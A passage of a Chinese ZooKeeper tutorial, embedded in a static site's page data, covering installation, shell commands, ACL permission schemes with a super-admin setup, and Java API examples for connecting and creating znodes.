Back-end"],isShowComments:!1},regularPath:"/views/backend/zookeeper.html",relativePath:"views/backend/zookeeper.md",key:"v-96305658",path:"/views/backend/zookeeper.html",headers:[{level:2,title:"简介/快速入门",slug:"简介-快速入门",normalizedTitle:"简介/快速入门",charIndex:149},{level:4,title:"应用场景",slug:"应用场景",normalizedTitle:"应用场景",charIndex:1431},{level:4,title:"Zookeeper的设计目标",slug:"zookeeper的设计目标",normalizedTitle:"zookeeper的设计目标",charIndex:2774},{level:4,title:"数据模型",slug:"数据模型",normalizedTitle:"数据模型",charIndex:3133},{level:4,title:"结点状态stat的属性",slug:"结点状态stat的属性",normalizedTitle:"结点状态stat的属性",charIndex:3647},{level:4,title:"单机安装",slug:"单机安装",normalizedTitle:"单机安装",charIndex:4608},{level:2,title:"常用shell命令",slug:"常用shell命令",normalizedTitle:"常用shell命令",charIndex:160},{level:2,title:"zookeeper的Acl权限控制",slug:"zookeeper的acl权限控制",normalizedTitle:"zookeeper的acl权限控制",charIndex:173},{level:4,title:"案例/远程登录",slug:"案例-远程登录",normalizedTitle:"案例/远程登录",charIndex:9212},{level:4,title:"acl 超级管理员",slug:"acl-超级管理员",normalizedTitle:"acl 超级管理员",charIndex:10747},{level:2,title:"zookeeper的 JavaAPI",slug:"zookeeper的-javaapi",normalizedTitle:"zookeeper的 javaapi",charIndex:194},{level:4,title:"连接到Zookeeper",slug:"连接到zookeeper",normalizedTitle:"连接到zookeeper",charIndex:13602},{level:4,title:"新增节点",slug:"新增节点",normalizedTitle:"新增节点",charIndex:14959},{level:4,title:"修改节点",slug:"修改节点",normalizedTitle:"修改节点",charIndex:18435},{level:4,title:"删除节点",slug:"删除节点",normalizedTitle:"删除节点",charIndex:19616},{level:4,title:"查看节点",slug:"查看节点",normalizedTitle:"查看节点",charIndex:20519},{level:4,title:"查看子节点",slug:"查看子节点",normalizedTitle:"查看子节点",charIndex:21978},{level:4,title:"检查节点是否存在",slug:"检查节点是否存在",normalizedTitle:"检查节点是否存在",charIndex:23504},{level:2,title:"事件监听机制",slug:"事件监听机制",normalizedTitle:"事件监听机制",charIndex:216},{level:4,title:"watcher架构",slug:"watcher架构",normalizedTitle:"watcher架构",charIndex:24955},{level:4,title:"watcher特性",slug:"watcher特性",normalizedTitle:"watcher特性",charIndex:25195},{level:2,title:"配置中心案例",slug:"配置中心案例",normalizedTitle:"配置中心案例",charIndex:226},{level:2,title:"分布式唯一id案例",slug:"分布式唯一id案例",normalizedTitle:"分布式唯一id案例",charIndex:236},{level:2,title:"分布式锁案例",slug:"分布式锁案例",normalizedTitle:"分布式锁案例",charIndex:249},{level:2,title:"集群搭建",slug:"集群搭建",normalizedTitle:"集群搭建",charIndex:259},{level:4,title:"一致性协议——zab协议",slug:"一致性协议-zab协议",normalizedTitle:"一致性协议——zab协议",charIndex:43460},{level:4,title:"leader选举",slug:"leader选举",normalizedTitle:"leader选举",charIndex:40850},{level:4,title:"observer角色及其配置",slug:"observer角色及其配置",normalizedTitle:"observer角色及其配置",charIndex:45968},{level:4,title:"API连接集群",slug:"api连接集群",normalizedTitle:"api连接集群",charIndex:47e3},{level:2,title:"curator介绍",slug:"curator介绍",normalizedTitle:"curator介绍",charIndex:267},{level:4,title:"基础用法",slug:"基础用法",normalizedTitle:"基础用法",charIndex:49163},{level:4,title:"创建",slug:"创建-2",normalizedTitle:"创建",charIndex:2727},{level:4,title:"修改",slug:"修改",normalizedTitle:"修改",charIndex:1675},{level:4,title:"删除",slug:"删除-2",normalizedTitle:"删除",charIndex:2766},{level:4,title:"读取节点",slug:"读取节点",normalizedTitle:"读取节点",charIndex:57797},{level:4,title:"读取子节点",slug:"读取子节点",normalizedTitle:"读取子节点",charIndex:59721},{level:4,title:"watcher",slug:"watcher",normalizedTitle:"watcher",charIndex:14243},{level:4,title:"事务",slug:"事务",normalizedTitle:"事务",charIndex:2891},{level:4,title:"分布式锁",slug:"分布式锁",normalizedTitle:"分布式锁",charIndex:249},{level:2,title:"四字监控命令/配置属性",slug:"四字监控命令-配置属性",normalizedTitle:"四字监控命令/配置属性",charIndex:280},{level:4,title:"conf",slug:"conf",normalizedTitle:"conf",charIndex:415},{level:4,title:"cons",slug:"cons",normalizedTitle:"cons",charIndex:69328},{level:4,title:"crst",slug:"crst",normalizedTitle:"crst",charIndex:69402},{level:4,title:"dump",slug:"dump",normalizedTitle:"dump",charIndex:69431},{level:4,title:"envi",slug:"envi",normalizedTitle:"envi",charIndex:69462},{level:4,title:"ruok",slug:"ruok",normalizedTitle:"ruok",charIndex:69484},{level:4,title:"stat",slug:"stat",normalizedTitle:"stat",charIndex:3607},{level:4,title:"srst",slug:"srst",normalizedTitle:"srst",charIndex:69593},{level:4,title:"wchs",slug:"wchs",normalizedTitle:"wchs",charIndex:69611},{level:4,title:"wchc",slug:"wchc",normalizedTitle:"wchc",charIndex:69665},{level:4,title:"wchp",slug:"wchp",normalizedTitle:"wchp",charIndex:72957},{level:4,title:"mntr",slug:"mntr",normalizedTitle:"mntr",charIndex:69760},{level:2,title:"ZooInspector图形化工具",slug:"zooinspector图形化工具",normalizedTitle:"zooinspector图形化工具",charIndex:295}],excerpt:"<Boxx/>\n<p>官方文档上这么解释zookeeper，它是一个分布式服务框架，是Apache Hadoop的一个子项目，它主要是用来解决分布式应用中经常遇到的一些数据管理问题，如：统一命名服务、状态同步服务、集群管理、分布式应用配置项的管理等。</p>\n<p>简单来说zookeeper=文件系统+监听通知机制。</p>\n",headersStr:"简介/快速入门 应用场景 Zookeeper的设计目标 数据模型 结点状态stat的属性 单机安装 常用shell命令 zookeeper的Acl权限控制 案例/远程登录 acl 超级管理员 zookeeper的 JavaAPI 连接到Zookeeper 新增节点 修改节点 删除节点 查看节点 查看子节点 检查节点是否存在 事件监听机制 watcher架构 watcher特性 配置中心案例 分布式唯一id案例 分布式锁案例 集群搭建 一致性协议——zab协议 leader选举 observer角色及其配置 API连接集群 curator介绍 基础用法 创建 修改 删除 读取节点 读取子节点 watcher 事务 分布式锁 四字监控命令/配置属性 conf cons crst dump envi ruok stat srst wchs wchc wchp mntr ZooInspector图形化工具",content:'官方文档上这么解释zookeeper，它是一个分布式服务框架，是Apache Hadoop的一个子项目，它主要是用来解决分布式应用中经常遇到的一些数据管理问题，如：统一命名服务、状态同步服务、集群管理、分布式应用配置项的管理等。\n\n简单来说zookeeper=文件系统+监听通知机制。\n\n\n\n * 简介/快速入门\n * 常用shell命令\n * zookeeper的Acl权限控制\n * zookeeper的 JavaAPI\n * 事件监听机制\n * 配置中心案例\n * 分布式唯一id案例\n * 分布式锁案例\n * 集群搭建\n * curator介绍\n * 四字监控命令/配置属性\n * ZooInspector图形化工具\n\n\n\n\n# 简介/快速入门\n\n官网：https://zookeeper.apache.org/\n\n> ZooKeeper is a centralized service for maintaining configuration information, naming, providing distributed synchronization, and providing group services. All of these kinds of services are used in some form or another by distributed applications. Each time they are implemented there is a lot of work that goes into fixing the bugs and race conditions that are inevitable. Because of the difficulty of implementing these kinds of services, applications initially usually skimp on them, which make them brittle in the presence of change and difficult to manage. Even when done correctly, different implementations of these services lead to management complexity when the applications are deployed.\n\nZooKeeper是一个集中的服务，用于维护配置信息、命名、提供分布式同步和提供组服务。所有这些类型的服务都以某种形式被分布式应用程序使用。每次它们被实现时，都会有大量的工作来修复不可避免的错误和竞争条件。由于实现这些服务的困难，应用程序最初通常会略过这些服务，这使得它们在出现更改时变得脆弱，并且难以管理。即使正确地执行了这些服务，在部署应用程序时，这些服务的不同实现也会导致管理复杂性\n\nzookeeper由雅虎研究院开发,是Google Chubby的开源实现,后来托管到 Apache,于2010年11月正式成为apache的顶级项目\n\n大数据生态系统里由很多组件的命名都是某些动物或者昆虫，比如hadoop大象，hive就是蜂巢，zookeeper即管理员，顾名思义就算管理大数据生态系统各组件的管理员，如下所示：\n\n\n\n# 应用场景\n\nzookeepepr是一个经典的分布式数据一致性解决方案，致力于为分布式应用提供一个高性能、高可用,且具有严格顺序访问控制能力的分布式协调存储服务。\n\n * 维护配置信息\n * 分布式锁服务\n * 集群管理\n * 生成分布式唯一ID\n\n 1. 维护配置信息\n    \n    * java编程经常会遇到配置项，比如数据库的url、 schema、user和 password等。通常这些配置项我们会放置在配置文件中，再将配置文件放置在服务器上当需要更改配置项时，需要去服务器上修改对应的配置文件。\n      \n      但是随着分布式系统的兴起,由于许多服务都需要使用到该配置文件,因此有必须保证该配置服务的高可用性(highavailability)和各台服务器上配置数据的一致性。\n      \n      通常会将配置文件部署在一个集群上，然而一个集群动辄上千台服务器，此时如果再一台台服务器逐个修改配置文件那将是非常繁琐且危险的的操作，因此就需要一种服务，能够高效快速且可靠地完成配置项的更改等操作，并能够保证各配置项在每台服务器上的数据一致性。\n      \n      zookeeper就可以提供这样一种服务，其使用Zab这种一致性协议来保证一致性。现在有很多开源项目使用zookeeper来维护配置，如在 hbase中，客户端就是连接一个 zookeeper，获得必要的 hbase集群的配置信息，然后才可以进一步操作。还有在开源的消息队列 kafka中，也便用zookeeper来维护 brokers的信息。在 alibaba开源的soa框架dubbo中也广泛的使用zookeeper管理一些配置来实现服务治理。\n      \n      \n\n 2. 分布式锁服务\n    \n    * 一个集群是一个分布式系统，由多台服务器组成。为了提高并发度和可靠性，多台服务器上运行着同一种服务。当多个服务在运行时就需要协调各服务的进度，有时候需要保证当某个服务在进行某个操作时，其他的服务都不能进行该操作，即对该操作进行加锁，如果当前机器挂掉后，释放锁并 fail over到其他的机器继续执行该服务\n\n 3. 集群管理\n    \n    * 一个集群有时会因为各种软硬件故障或者网络故障，出现棊些服务器挂掉而被移除集群，而某些服务器加入到集群中的情况，zookeeper会将这些服务器加入/移出的情况通知给集群中的其他正常工作的服务器，以及时调整存储和计算等任务的分配和执行等。此外zookeeper还会对故障的服务器做出诊断并尝试修复。\n      \n      \n\n 4. 生产分布式唯一ID\n    \n    * 在过去的单库单表型系统中，通常可以使用数据库字段自带的auto_ increment属性来自动为每条记录生成一个唯一的ID。但是分库分表后，就无法在依靠数据库的auto_ Increment属性来唯一标识一条记录了。此时我们就可以用zookeeper在分布式环境下生成全局唯一ID。\n      \n      做法如下:每次要生成一个新id时，创建一个持久顺序节点，创建操作返回的节点序号，即为新id，然后把比自己节点小的删除即可\n\n# Zookeeper的设计目标\n\nzooKeeper致力于为分布式应用提供一个高性能、高可用，且具有严格顺序访问控制能力的分布式协调服务\n\n 1. 高性能\n    * zookeeper将全量数据存储在内存中，并直接服务于客户端的所有非事务请求，尤其用于以读为主的应用场景\n 2. 高可用\n    * zookeeper一般以集群的方式对外提供服务，一般3~5台机器就可以组成一个可用的 Zookeeper集群了，每台机器都会在内存中维护当前的服务器状态，井且每台机器之间都相互保持着通信。只要集群中超过一半的机器都能够正常工作，那么整个集群就能够正常对外服务\n 3. 严格顺序访问\n    * 对于来自客户端的每个更新请求，Zookeeper都会分配一个全局唯一的递增编号，这个编号反应了所有事务操作的先后顺序\n\n# 数据模型\n\nzookeeper的数据结点可以视为树状结构(或目录)，树中的各个结点被称为znode(即zookeeper node)，一个znode可以由多个子结点。zookeeper结点在结构上表现为树状；\n\n使用路径path来定位某个znode，比如/ns-1/itcast/mysqml/schemal1/table1，此处ns-1，itcast、mysql、schemal1、table1分别是根结点、2级结点、3级结点以及4级结点；其中ns-1是itcast的父结点，itcast是ns-1的子结点，itcast是mysql的父结点....以此类推\n\nznode，间距文件和目录两种特点，即像文件一样维护着数据、元信息、ACL、时间戳等数据结构，又像目录一样可以作为路径标识的一部分\n\n\n\n那么如何描述一个znode呢？一个znode大体上分为3个部分：\n\n * 结点的数据：即znode data(结点path，结点data)的关系就像是Java map中的 key value关系\n * 结点的子结点children\n * 结点的状态stat：用来描述当前结点的创建、修改记录，包括cZxid、ctime等\n\n# 结点状态stat的属性\n\n在zookeeper shell中使用 get命令查看指定路径结点的data、stat信息\n\n\n\n属性说明：\n\n结点的各个属性如下。其中重要的概念是Zxid(Zookeeper Transaction ID)，Zookeeper结点的每一次更改都具有唯一的Zxid，如果Zxid-1 小于Zxid-2 ，则Zxid-1 的更改发生在 Zxid-2更改之前\n\nhttps://zookeeper.apache.org/doc/r3.4.14/zookeeperProgrammers.html#sc_zkDataModel_znodes\n\n * cZxid数据结点创建时的事务ID——针对于zookeeper数据结点的管理：我们对结点数据的一些写操作都会导致zookeeper自动地为我们去开启一个事务，并且自动地去为每一个事务维护一个事务ID\n * ctime数据结点创建时的时间\n * mZxid数据结点最后一次更新时的事务ID\n * mtime数据结点最后一次更新时的时间\n * pZxid数据节点最后一次修改此znode子节点更改的zxid\n * cversion子结点的更改次数\n * dataVersion结点数据的更改次数\n * aclVersion结点的ACL更改次数——类似linux的权限列表，维护的是当前结点的权限列表被修改的次数\n * ephemeralOwner如果结点是临时结点，则表示创建该结点的会话的SessionID；如果是持久结点，该属性值为0\n * dataLength数据内容的长度\n * numChildren数据结点当前的子结点个数\n\n结点类型\n\nzookeeper中的结点有两种，分别为临时结点和永久结点。结点的类型在创建时被确定，并且不能改变\n\n * 临时节点：\n   * 该节点的生命周期依赖于创建它们的会话。一旦会话( Session）结束，临时节点将被自动删除，当然可以也可以手动删除。虽然每个临时的 Znode都会绑定到一个客户端会话，但他们对所有的客户端还是可见的。另外，Zookeeper的临时节点不允许拥有子节点\n * 持久化结点：\n   * 该结点的生命周期不依赖于会话，并且只有在客户端显示执行删除操作的时候，它们才能被删除\n\n# 单机安装\n\n测试系统环境centos7.3\n\nzookeeper:zookeeper-3.4.10.tar.gz\n\njdk:jdk-8u131-linux-x64.tar.gz\n\nhttp://archive.apache.org/dist/zookeeper/\n\n 1. 在centos中使用 root用户创建 zookeeper用户，用户名:zookeeper密码:zookeeper\n    \n    * useradd zookeeper\n      passwd zookeeper\n      su zookeeper\n      \n      \n      1\n      2\n      3\n      \n\n 2. zookeeper底层依赖于jdk，zookeeper用户登录后，根目录下先进行jdk 的安装，jdk使用 jdk-8u131-linux-x64.tar.gz\n    \n    * tar -zxf tar.gz\n      \n      \n      1\n      \n\n 3. 配置jdk 环境变量\n    \n    * vi /etc/profile\n      JAVA_HOME=/home/zookeeper/jdk1.8.0_131\n      export JAVA_HOME\n      \n      PATH=$JAVA_HOME/bin:$PATH\n      export PATH\n      \n      souce /etc/profile\n      \n      \n      1\n      2\n      3\n      4\n      5\n      6\n      7\n      8\n      \n\n 4. 检测jdk安装\n    \n    * java -version // 如果反馈了Java信息，则成功\n\n 5. zookeeper 上传解压\n    \n    * tar -zxf tar.gz\n\n 6. 为zookeeper准备配置文件\n    \n    * # 进入conf目录\n      cd /home/zookeeper/zookeeper-3.4.10/conf\n      # 复制配置文件\n      cp zoo_sampe.cfg zoo.cfg\n      # zookeeper 根目录下创建data目录\n      mkdir data\n      # vi 配置文件中的dataDir\n      # 此路径用于存储zookeeper中数据的内存快照、及事务日志文件，虽然zookeeper是使用内存的，但是需要持久化一些数据来保证数据的安全，和redis一样\n      dataDir=/home/zookeeper/zookeeper-3.4.10/data\n      \n      \n      1\n      2\n      3\n      4\n      5\n      6\n      7\n      8\n      9\n      \n\n 7. 启动zookeeper\n    \n    * # 进入zookeeper的bin目录\n      cd /home/zookeeper/zookeeper-3.4.10/bin\n      # 启动zookeeper\n      ./zkServer.sh start\n      \n      # 启动: zkServer.sh start\n      # 停止: zkServer.sh stop\n      # 查看状态：zkServer.sh status\n      \n      # 进入zookeeper 内部\n      ./zkCli.sh\n      \n      \n      1\n      2\n      3\n      4\n      5\n      6\n      7\n      8\n      9\n      10\n      11\n      \n\n\n# 常用shell命令\n\nzookeeper——getting started——https://zookeeper.apache.org/doc/r3.4.14/zookeeperStarted.html#sc_FileManagement\n\n# 查询\n\nget /hadoop 查看结点的数据和属性 stat /hadoop 查看结点的属性\n\n# 创建\n\n创建结点并写入数据：\n\ncreate [-s] [-e] path data # 其中 -s 为有序结点，-e 临时结点（默认是持久结点）\n\ncreate /hadoop "123456"  # 此时，如果quit退出后再./ZkCient.sh 登入\n                         # 再用输入 get /hadoop 获取，结点依然存在(永久结点)\n\t\t\t\t       \ncreate -s /a "a"         # 创建一个持久化有序结点，创建的时候可以观察到返回的数据带上了一个id       \ncreate -s /b "b"         # 返回的值，id递增了\n\ncreate -s -e /aa "aa"    # 依然还会返回自增的id，quit后再进来，继续创建，id依然是往后推的\n\ncreate /aa/xx            # 继续创建结点，可以看到pZxid变化了\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n# 更新\n\n更新结点的命令是set，可以直接进行修改，如下：\n\nset path [version]\n\nset /hadoop "345"        # 修改结点值\n\nset /hadoop "hadoop-x" 1 # 也可以基于版本号进行更改，类似于乐观锁，当传入版本号(dataVersion)\n                         # 和当前结点的数据版本号不一致时，zookeeper会拒绝本次修改\n\n\n1\n2\n3\n4\n\n\n# 删除\n\n删除结点的语法如下：\n\ndelete path [version] 和 set 方法相似，也可以传入版本号\n\ndelete /hadoop           # 删除结点\ndelete /hadoop 1         # 乐观锁机制，与set 方法一致\n\n\n1\n2\n\n\n要想删除某个结点及其所有后代结点，可以使用递归删除，命令为 rmr path\n\n查看结点列表\n\nls /hadoop               # 可以查看结点的列表\nls2 /hadoop              # 可以查看结点的列表以及目标结点的信息\n\nls /                     # 根节点\n\n\n1\n2\n3\n4\n\n\n监听器get path [watch] | stat path [watch]\n\n使用get path [watch] 注册的监听器能够在结点内容发生改变的时候，向客户端发出通知。需要注意的是zookeeper的触发器是一次性的(One-time trigger)，即触发一次后就会立即失效\n\nget /hadoop watch        # get 的时候添加监听器，当值改变的时候，监听器返回消息\nset /hadoop 45678        # 测试\n\n\n1\n2\n\n\nls\\ls2 path [watch]\n\n使用 ls path [watch] 或 ls2 path [watch]注册的监听器能够监听该结点下所有子节点的增加和删除操作\n\nls /hadoop watch         # 添加监听器\nset /hadoop/node "node"\n\n\n1\n2\n\n\n\n# zookeeper的Acl权限控制\n\nhttps://zookeeper.apache.org/doc/r3.4.14/zookeeperProgrammers.html#sc_ZooKeeperAccessControl\n\nzookeeper类似文件系统，client可以创建结点、更新结点、删除结点，那么如何做到结点的权限控制呢？\n\nzookeeper的 access control list 访问控制列表可以做到这一点\n\nacl权限控制，使用scheme：id：permission来标识，主要涵盖3个方面：\n\nhttps://zookeeper.apache.org/doc/r3.4.14/zookeeperProgrammers.html#sc_BuiltinACLSchemes\n\n * 权限模式(scheme)：授权的策略\n * 授权对象(id)：授权的对象\n * 权限(permission)：授予的权限\n\n其特性如下：\n\n * zookeeper的权限控制是基于每个znode结点的，需要对每个结点设置权限\n\n * 每个znode支持多种权限控制方案和多个权限\n\n * 子结点不会继承父结点的权限，客户端无权访问某结点，但可能可以访问它的子结点：\n   \n   例如setAcl /test2 ip:192.168.133.133:crwda // 将结点权限设置为Ip：192.168.133.133 的客户端可以对节点进行 增删改查和管理权限\n\n权限模式\n\n * 采用何种方式授权\n\n * \n\n * 方案       描述\n   world    只有一个用户：anyone，代表登录zookeeper所有人(默认)\n   ip       对客户端使用IP地址认证\n   auth     使用已添加认证的用户认证\n   digest   使用"用户名：密码"方式认证\n\n授权对象\n\n * 给谁授予权限\n * 授权对象ID是指，权限赋予的实体，例如：IP地址或用户\n\n授权的权限\n\n * 授予什么权限\n\n * create、delete、read、writer、admin也就是 增、删、查、改、管理权限，这5种权限简写为 c d r w a，注意： 这五种权限中，有的权限并不是对结点自身操作的例如：delete是指对子结点的删除权限\n   \n   可以试图删除父结点，但是子结点必须删除干净，所以delete的权限也是很有用的\n\n * \n\n * 权限       ACL简写   描述\n   create   c       可以创建子结点\n   delete   d       可以删除子结点(仅下一级结点)\n   read     r       可以读取结点数据以及显示子结点列表\n   write    w       可以设置结点数据\n   admin    a       可以设置结点访问控制权限列表\n\n授权的相关命令\n\n * \n\n * 命令        使用方式      描述\n   getAcl    getAcl    读取ACL权限\n   setAcl    setAcl    设置ACL权限\n   addauth   addauth   添加认证用户\n\n# 案例/远程登录\n\n./zkServer.sh -server 192.168.133.133 可以远程登录\n\nworld权限模式\n\n * getAcl /node // 读取权限信息\n * setAcl /node world:anyone:drwa // 设置权限(禁用创建子结点的权限)\n\nip模式\n\n./zkServer.sh -server 192.168.133.133 可以远程登录\n\n * setAcl /hadoop ip:192.168.133.133:drwa\n * 如果在两台不同的虚拟机中，另一台用远程连接的模式，进行上面这条命令，那么只会有一台被授权\n * 需要两台虚拟机一起授权的话需要用逗号将授权列表隔开：setAcl /hadoop ip:192.168.133.133:cdrwa,ip:192.168.133.132:cdrwa\n\nauth认证用户模式\n\naddauth digest <user>:<password>\n\nsetAcl <path> auth:<user>:<acl>\n\n * create /hadoop "hadoop"           # 初始化测试用的结点\n   addauth digest itcast:123456      # 添加认证用户\n   setAcl /hadoop auth:itcast:cdrwa  # 设置认证用户\n   quit                              # 退出后再./zkCli.sh 进入\n   get /hadoop                       # 这个时候就没有权限了，需要再次认证\n   addauth digest itcast:123456      # 认证，密码错了的话 zookeeper 不会报错，但是不能认证\n   get /hadoop\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   \n\nDigest授权模式\n\nsetAcl <path> digest:<user>:<password>:<acl>\n\n * 这里的密码是经过SHA1以及BASE64处理的密文，在shell 中可以通过以下命令计算：\n   \n   * echo -n <user>:<password> | openssl dgst -binary -sha1 | openssl base64\n     \n     \n     1\n     \n   \n   * # 计算密码\n     echo -n itcast:12345 | openssl dgst -binary -sha1 | openssl base64\n     # 获取密码，设置权限列表\n     setAcl /hadoop digest:itcast:qUFSHxJjItUW/93UHFXFVGlvryY=:cdrwa\n     # 现在想要get /hadoop 需要登录了\n     addauth digest itcast:12345\n     get /hadoop\n     \n     \n     1\n     2\n     3\n     4\n     5\n     6\n     7\n     \n\n多种授权模式\n\n仅需逗号隔开\n\n *  setAcl /hadoop ip:192.168.133.132:cdrwa,auth:hadoop:cdrwa,digest:itcast:673OfZhUE8JEFMcu0l64qI8e5ek=:cdrwa\n   \n   \n   1\n   \n\n# acl 超级管理员\n\n * zookeeper的权限管理模式有一种叫做super，该模式提供一个超管，可以方便的访问任何权限的节点\n   \n   假设这个超管是supper:admin，需要为超管生产密码的密文\n   \n   echo -n super:admin | openssl dgst -binary -sha1 | openssl base64\n   \n   \n   1\n   \n\n * 那么打开zookeeper目录下/bin/zkServer.sh服务器脚本文件，找到如下一行：\n   \n    /nohup # 快速查找，可以看到如下\n    nohup "$JAVA" "-Dzookeeper.log.dir=${ZOO_LOG_DIR}" "-Dzookeeper.root.logger=${ZOO_LOG4J_PROP}"\n   \n   \n   1\n   2\n   \n\n * 这个就算脚本中启动zookeeper的命令，默认只有以上两个配置项，我们需要添加一个超管的配置项\n   \n   "-Dzookeeper.DigestAuthenticationProvider.superDigest=super:xQJmxLMiHGwaqBvst5y6rkB6HQs="\n   \n   \n   1\n   \n\n * 修改后命令变成如下\n   \n   nohup "$JAVA" "-Dzookeeper.log.dir=${ZOO_LOG_DIR}" "-Dzookeeper.root.logger=${ZOO_LOG4J_PROP}" "-Dzookeeper.DigestAuthenticationProvider.superDigest=super:xQJmxLMiHGwaqBvst5y6rkB6HQs="\n   \n   \n   1\n   \n\n * # 重起后，现在随便对任意节点添加权限限制\n   setAcl /hadoop ip:192.168.1.1:cdrwa # 这个ip并非本机\n   # 现在当前用户没有权限了\n   getAcl /hadoop\n   # 登录超管\n   addauth digest super:admin\n   # 强行操作节点\n   get /hadoop\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   \n\n\n# zookeeper的 JavaAPI\n\n<dependency>\n            <groupId>com.101tec</groupId>\n            <artifactId>zkclient</artifactId>\n            <exclusions>\n                <exclusion>\n                    <artifactId>zookeeper</artifactId>\n                    <groupId>org.apache.zookeeper</groupId>\n                </exclusion>\n                <exclusion>\n                    <artifactId>log4j</artifactId>\n                    <groupId>log4j</groupId>\n                </exclusion>\n                <exclusion>\n                    <artifactId>slf4j-log4j12</artifactId>\n                    <groupId>org.slf4j</groupId>\n                </exclusion>\n                <exclusion>\n                    <artifactId>slf4j-api</artifactId>\n                    <groupId>org.slf4j</groupId>\n                </exclusion>\n            </exclusions>\n            <version>0.9</version>\n        </dependency>\n        <dependency>\n            <artifactId>zookeeper</artifactId>\n            <exclusions>\n                <exclusion>\n                    <artifactId>log4j</artifactId>\n                    <groupId>log4j</groupId>\n                </exclusion>\n                <exclusion>\n                    <artifactId>slf4j-log4j12</artifactId>\n                    <groupId>org.slf4j</groupId>\n                </exclusion>\n            </exclusions>\n            <groupId>org.apache.zookeeper</groupId>\n            <version>3.4.10</version>\n        </dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\nzonde是 zookeeper集合的核心组件，zookeeper API 提供了一小组使用 zookeeper集群来操作znode的所有细节\n\n客户端应该遵循以下步骤，与zookeeper服务器进行清晰和干净的交互\n\n * 连接到zookeeper服务器。zookeeper服务器为客户端分配会话ID\n * 定期向服务器发送心跳。否则，zookeeper服务器将过期会话ID，客户端需要重新连接\n * 只要会话Id处于活动状态，就可以获取/设置znode\n * 所有任务完成后，断开与zookeeper服务器连接，如果客户端长时间不活动，则zookeeper服务器将自动断开客户端\n\n# 连接到Zookeeper\n\n这部分，官网的解释十分稀少https://zookeeper.apache.org/doc/r3.4.14/zookeeperStarted.html#sc_ConnectingToZooKeeper\n\n[zkshell: 0] help\nZooKeeper host:port cmd args\n    get path [watch]\n    ls path [watch]\n    set path data [version]\n    delquota [-n|-b] path\n    quit\n    printwatches on|off\n    create path data acl\n    stat path [watch]\n    listquota path\n    history\n    setAcl path acl\n    getAcl path\n    sync path\n    redo cmdno\n    addauth scheme auth\n    delete path [version]\n    deleteall path\n    setquota -n|-b val path\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\nZookeeper(String connectionString, int sessionTimeout, watcher watcher)\n\n\n1\n\n * connectionString - zookeeper主机\n * sessionTimeout- 会话超时\n * watcher - 实现"监听器" 对象。zookeeper集合通过监视器对象返回连接状态\n\npublic static void main(String[] args) throws IOException, InterruptedException {\n        CountDownLatch countDownLatch = new CountDownLatch(1);\n\n        ZooKeeper zookeeper = new ZooKeeper("192.168.133.133:2181", 5000, (WatchedEvent x) -> {\n            if (x.getState() == Watcher.Event.KeeperState.SyncConnected) {\n                System.out.println("连接成功");\n                countDownLatch.countDown();\n            }\n        });\n        countDownLatch.await();\n        System.out.println(zookeeper.getSessionId());\n        zookeeper.close();\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# 新增节点\n\n * // 同步\n   create(String path, byte[] data, List<ACL> acl, CreateMode createMode)\n   // 异步\n   create(String path, byte[] data, List<ACL> acl, CreateMode createMode,\n         AsynCallback.StringCallback callBack, Object ctx)\n   \n   \n   1\n   2\n   3\n   4\n   5\n   \n * \n\n * 参数           解释\n   path         znode路径\n   data         数据\n   acl          要创建的节点的访问控制列表。zookeeper API提供了一个静态接口 ZooDefs.Ids\n                来获取一些基本的acl列表。例如，ZooDefs.Ids.OPEN_ACL_UNSAFE返回打开znode的acl列表\n   createMode   节点的类型，这是一个枚举\n   callBack     异步回调接口\n   ctx          传递上下文参数\n\n示例：\n\n * // 枚举的方式\n       public static void createTest1() throws Exception{\n           String str = "node";\n           String s = zookeeper.create("/node", str.getBytes(),\n                   ZooDefs.Ids.READ_ACL_UNSAFE, CreateMode.PERSISTENT);\n           System.out.println(s);\n       }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   \n\n * // 自定义的方式\n       public static void createTest2() throws Exception{\n           ArrayList<ACL> acls = new ArrayList<>();\n           Id id = new Id("ip","192.168.133.133");\n           acls.add(new ACL(ZooDefs.Perms.ALL,id));\n           zookeeper.create("/create/node4","node4".getBytes(),acls,CreateMode.PERSISTENT);\n       }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   \n\n * // auth\n       public static void createTest3() throws  Exception{\n           zookeeper.addAuthInfo("digest","itcast:12345".getBytes());\n           zookeeper.create("/node5","node5".getBytes(),\n                   ZooDefs.Ids.CREATOR_ALL_ACL,CreateMode.PERSISTENT);\n       }\n   // 自定义的方式\n       public static void createTest3() throws  Exception{\n   //        zookeeper.addAuthInfo("digest","itcast:12345".getBytes());\n   //        zookeeper.create("/node5","node5".getBytes(),\n   //                ZooDefs.Ids.CREATOR_ALL_ACL,CreateMode.PERSISTENT);\n           zookeeper.addAuthInfo("digest","itcast:12345".getBytes());\n           List<ACL> acls = new ArrayList<>();\n           Id id = new Id("auth","itcast");\n           acls.add(new ACL(ZooDefs.Perms.READ,id));\n           zookeeper.create("/create/node6","node6".getBytes(),\n                   acls,CreateMode.PERSISTENT);\n       }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   \n\n * // digest \n   public static void createTest3() throws  Exception{\n       List<ACL> acls = new ArrayList<>();\n       Id id = new Id("digest","itcast:qUFSHxJjItUW/93UHFXFVGlvryY=");\n       acls.add(new ACL(ZooDefs.Perms.READ,id));\n       zookeeper.create("/create/node7","node7".getBytes(), \t\n                        acls,CreateMode.PERSISTENT);\n   }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   \n\n * // 异步\n       public static void createTest4() throws  Exception{\n           zookeeper.create("/node12", "node12".getBytes(), ZooDefs.Ids.OPEN_ACL_UNSAFE, CreateMode.PERSISTENT, new AsyncCallback.StringCallback(){\n               /**\n                * @param rc 状态，0 则为成功，以下的所有示例都是如此\n                * @param path 